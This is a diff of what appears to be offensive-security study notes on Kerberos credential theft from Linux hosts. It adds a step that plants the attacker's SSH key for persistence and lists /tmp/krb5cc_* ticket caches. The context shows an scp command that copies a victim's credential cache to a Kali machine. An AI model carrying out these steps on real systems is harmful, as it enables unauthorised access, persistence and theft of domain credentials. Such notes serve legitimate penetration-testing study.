@@ -508,7 +508,7 @@ runas /user:corp\jen powershell.exe
       ls -al /tmp/krb5cc_*
       ```
 
-
+      If not present but has domain user on linux box --> try to [ssh into that domain user](../services/22-ssh.md#ssh-persistency) (add attacker's SSH public key to domain user authorized host & ssh as domain user) and `ls -la /tmp/krb5cc_*`
 * Copy credential cache files to Kali
   *   ```bash
       scp root@linuxvictim:/tmp/krb5cc_607000500_qZWKpe .
